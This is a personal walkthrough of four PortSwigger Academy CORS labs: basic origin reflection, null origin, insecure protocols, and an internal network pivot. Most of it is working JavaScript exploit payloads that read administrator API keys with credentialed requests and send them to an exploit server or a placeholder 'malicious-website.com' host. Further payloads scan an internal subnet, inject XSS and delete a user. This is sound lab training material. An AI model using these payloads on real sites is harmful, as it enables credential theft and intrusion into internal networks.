# Portswigger
## Cross-Origin Resource Sharing (CORS)
### CORS vulnerability with basic origin reflection
```bash

# This website has an insecure CORS configuration in that it trusts all origins.

# To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to: Home -> My account
Go to: HTTP history
Note some of the requests include "Origin:" header
Find:

GET /accountDetails HTTP/1.1

Note the response
Response:

Access-Control-Allow-Credentials: true

Send to repeater
Add:

Origin: test.com

Response:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://test.com
Access-Control-Allow-Credentials: true

Go to: "Go to exploit server"
Change:

var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
};

To

<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://ac3c1f9b1ed1dea6c0345b8200a6001b.web-security-academy.net/AccountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='/log?key='+this.responseText;
};
</script>

Body:

<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://ac3c1f9b1ed1dea6c0345b8200a6001b.web-security-academy.net/AccountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='/log?key='+this.responseText;
};
</script>

Store
Deliver exploit to victim
View exploit

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220525231617.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220525233554.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220525233834.png)

### CORS vulnerability with trusted null origin
```bash

# This website has an insecure CORS configuration in that it trusts the "null" origin.

# To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to: HTTP history

GET /accountDetails HTTP/1.1

Note the response
Response:

Access-Control-Allow-Credentials: true

Send to repeater
Add:

Origin: null

Response:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

Go to: "Go to exploit server"

Change:

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>

To
Body:

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://ac831fc31f76f5f8c0f36cbd0002007a.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-acda1f0f1f2cf586c0796c23016c0026.web-security-academy.net/exploit/log?key='+this.responseText;
};
</script>"></iframe>

Store
Deliver exploit to victim
View exploit

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220525235437.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220525235504.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220526000402.png)

### CORS vulnerability with trusted insecure protocols
```bash

# This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

# To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to: HTTP history

GET /accountDetails HTTP/1.1

Note the response
Response:

Access-Control-Allow-Credentials: true

Send to repeater
Add:

Origin: https://check.acec1f431e3eaf6dc01315fe008800b7.web-security-academy.net

Response:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://check.acec1f431e3eaf6dc01315fe008800b7.web-security-academy.net
Access-Control-Allow-Credentials: true

Go to: "Home"
"View details"
Intercept is on
Click "Check stock"
Send to repeater
Intercept is off
Change:

GET /?productId=1&storeId=1 HTTP/1.

To

GET /?productId=%3c%69%6d%67%20%73%72%63%3d%31%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e&storeId=1 HTTP/1.

Note the Successful XSS payload
Go to: "Go to exploit server"
Change:

<script>
    document.location="http://check.exploit-acde1f141ec3afb1c044153e019800d0.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://exploit-acde1f141ec3afb1c044153e019800d0.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>

To
Body:

<script>
    document.location="http://stock.acec1f431e3eaf6dc01315fe008800b7.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://acec1f431e3eaf6dc01315fe008800b7.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-acde1f141ec3afb1c044153e019800d0.web-security-academy.net/exploit/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>

Store
View exploit
Deliver exploit to victim
Access log

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220526002619.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220526002641.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220526005716.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220526005633.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220526005611.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220526011118.png)

### CORS vulnerability with internal network pivot attack
```bash

# This website has an insecure CORS configuration in that it trusts all internal network origins.

# This lab requires multiple steps to complete. To solve the lab, craft some JavaScript to locate an endpoint on the local network (192.168.0.0/24, port 8080) that you can then use to identify and create a CORS-based attack to delete a user. The lab is solved when you delete user Carlos.

Reference - Portswigger Solution
currentLab === 'Not easy'

Go to: "Go to exploit server"
Body:

<script>
var q = [], collaboratorURL = 'http://exploit-ac221faa1f9f2fdec0091bbc013600a1.web-security-academy.net/exploit';

for(i=1;i<=255;i++) {
	q.push(function(url) {
		return function(wait) {
			fetchUrl(url, wait);
		}
	}('http://192.168.0.'+i+':8080'));
}

for(i=1;i<=20;i++){
	if(q.length)q.shift()(i*100);
}

function fetchUrl(url, wait) {
	var controller = new AbortController(), signal = controller.signal;
	fetch(url, {signal}).then(r => r.text().then(text => {
		location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
	}))
	.catch(e => {
		if(q.length) {
			q.shift()(wait);
		}
	});
	setTimeout(x => {
		controller.abort();
		if(q.length) {
			q.shift()(wait);
		}
	}, wait);
}
</script>

Enumerate for XSS vulnerability with the newly found ip:port
Go to: "Go to exploit server"
Body:

<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r => r.text().then(text => {
		xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
	}))
}

fetchUrl("http://192.168.0.14:8080", "http://exploit-ac221faa1f9f2fdec0091bbc013600a1.web-security-academy.net/exploit");
</script>

Go to: "Access Log"
Note the "/Exploit?FoundXSS=1"
Access the Administrator panel
Go to: "Go to exploit server"
Body:

<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r=>r.text().then(text=>
	{
		xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
	}
	))
}

fetchUrl("http://192.168.0.14:8080", "http://exploit-ac221faa1f9f2fdec0091bbc013600a1.web-security-academy.net/exploit");
</script>

Go to: "Acces log"
Ctrl+f
Type: "administrator"
Copy said line and URL-decode

172.31.31.47    2022-05-27 07:04:01 +0000 "GET /exploit?code=%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%20src%3D%22%2Fresources%2Flabheader%2Fjs%2FlabHeader.js%22%3E%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22academyLabHeader%22%3E%0A%20%20%20%20%3Csection%20class%3D%22academyLabBanner%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22container%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22logo%22%3E%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22title-container%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3ECORS%20vulnerability%20with%20internal%20network%20pivot%20attack%3C%2Fh2%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20id%3D%22exploit-link%22%20class%3D%22button%22%20target%3D%22_blank%22%20href%3D%22http%3A%2F%2Fexploit-ac221faa1f9f2fdec0091bbc013600a1.web-security-academy.net%22%3EGo%20to%20exploit%20server%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class%3D%22link-back%22%20href%3D%22https%3A%2F%2Fportswigger.net%2Fweb-security%2Fcors%2Flab-internal-network-pivot-attack%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Back%26nbsp%3Bto%26nbsp%3Blab%26nbsp%3Bdescription%26nbsp%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20version%3D%221.1%22%20id%3D%22Layer_1%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20x%3D%220px%22%20y%3D%220px%22%20viewBox%3D%220%200%2028%2030%22%20enable-background%3D%22new%200%200%2028%2030%22%20xml%3Aspace%3D%22preserve%22%20title%3D%22back-arrow%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cpolygon%20points%3D%221.4%2C0%200%2C1.2%2012.6%2C15%200%2C28.8%201.4%2C30%2015.1%2C15%22%3E%3C%2Fpolygon%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cpolygon%20points%3D%2214.3%2C0%2012.9%2C1.2%2025.6%2C15%2012.9%2C28.8%2014.3%2C30%2028%2C15%22%3E%3C%2Fpolygon%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fsvg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22widgetcontainer-lab-status%20is-notsolved%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3ELAB%3C%2Fspan%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3ENot%20solved%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22lab-status-icon%22%3E%3C%2Fspan%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%3C%2Fsection%3E%3C%2Fdiv%3E%0A%20%20%20%20%0A%0A%20%20%20%20%20%20%20%20%3Cdiv%20theme%3D%22%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Csection%20class%3D%22maincontainer%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22container%20is-page%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cheader%20class%3D%22navigation-header%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csection%20class%3D%22top-links%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22%2F%22%3EHome%3C%2Fa%3E%3Cp%3E%7C%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22%2Fadmin%22%3EAdmin%20panel%3C%2Fa%3E%3Cp%3E%7C%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22%2Fmy-account%3Fid%3Dadministrator%22%3EMy%20account%3C%2Fa%3E%3Cp%3E%7C%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fsection%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fheader%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cheader%20class%3D%22notification-header%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fheader%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20style%3D%22margin-top%3A%201em%22%20class%3D%22login-form%22%20action%3D%22%2Fadmin%2Fdelete%22%20method%3D%22POST%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%3D%22%22%20type%3D%22hidden%22%20name%3D%22csrf%22%20value%3D%22K5Xuu0xmefCMusCyrRkPr5d0vVC5EiOE%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%3EUsername%3C%2Flabel%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%3D%22%22%20type%3D%22text%22%20name%3D%22username%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D%22button%22%20type%3D%22submit%22%3EDelete%20user%3C%2Fbutton%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fsection%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%0A%0A HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36"

// or // URL-decoded

172.31.31.47    2022-05-27 07:04:01  0000 "GET /exploit?code=
            <script src="/resources/labheader/js/labHeader.js"></script>
            <div id="academyLabHeader">
    <section class="academyLabBanner">
        <div class="container">
            <div class="logo"></div>
                <div class="title-container">
                    <h2>CORS vulnerability with internal network pivot attack</h2>
                    <a id="exploit-link" class="button" target="_blank" href="http://exploit-ac221faa1f9f2fdec0091bbc013600a1.web-security-academy.net">Go to exploit server</a>
                    <a class="link-back" href="https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack">
                        Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                        <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 28 30" enable-background="new 0 0 28 30" xml:space="preserve" title="back-arrow">
                            <g>
                                <polygon points="1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15"></polygon>
                                <polygon points="14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15"></polygon>
                            </g>
                        </svg>
                    </a>
                </div>
                <div class="widgetcontainer-lab-status is-notsolved">
                    <span>LAB</span>
                    <p>Not solved</p>
                    <span class="lab-status-icon"></span>
                </div>
            </div>
        </section></div>
    

        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href="/">Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account?id=administrator">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST">
                        <input required="" type="hidden" name="csrf" value="K5Xuu0xmefCMusCyrRkPr5d0vVC5EiOE">
                        <label>Username</label>
                        <input required="" type="text" name="username">
                        <button class="button" type="submit">Delete user</button>
                    </form>
                </div>
            </section>
        </div>
    

 HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36"

Delete username "Carlos"
Go to: "Go to exploit server"
Body:

<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url){
	fetch(url).then(r=>r.text().then(text=>
	{
	xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
	}
	))
}

fetchUrl("http://192.168.0.14:8080");
</script>

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220527014606.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220527014500.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220527015500.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220527020654.png)

#hacking
